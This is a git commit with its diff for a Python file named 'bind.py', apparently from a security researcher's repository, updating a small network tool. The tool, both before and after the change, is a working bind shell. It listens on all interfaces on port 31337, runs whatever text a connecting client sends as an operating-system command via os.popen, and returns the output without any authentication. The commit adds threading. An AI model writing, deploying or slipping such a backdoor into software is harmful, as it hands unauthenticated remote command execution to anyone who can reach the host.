c59c3b2171c9cd155135a9a12c637e313838978e
steph <i.yushkevich@dsec.ru>
2017-09-22 14:57:51 +0300

    bind update

--- bind.py
+++ bind.py
@@ -1,14 +1,10 @@
-import SocketServer,os
+#!/usr/bin/env python
 
-class MyTCPHandler(SocketServer.BaseRequestHandler):
-    """
-    The RequestHandler class for our server.
 
-    It is instantiated once per connection to the server, and must
-    override the handle() method to implement communication to the
-    client.
-    """
+import SocketServer, os
+from threading import Thread
 
+class service(SocketServer.BaseRequestHandler):
     def handle(self):
         # self.request is the TCP socket connected to the client
         self.data = self.request.recv(1024).strip()
@@ -17,13 +13,12 @@ class MyTCPHandler(SocketServer.BaseRequestHandler):
         # exec os command and return result
         result = os.popen(self.data+" 2>&1").read()
         self.request.sendall(result)
+        self.request.close()
 
-if __name__ == "__main__":
-    HOST, PORT = "0.0.0.0", 31337
 
-    # Create the server
-    server = SocketServer.TCPServer((HOST, PORT), MyTCPHandler)
 
-    # Activate the server; this will keep running until you
-    # interrupt the program with Ctrl-C
-    server.serve_forever()
+class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
+    pass
+
+t = ThreadedTCPServer(('0.0.0.0',31337), service)
+t.serve_forever()
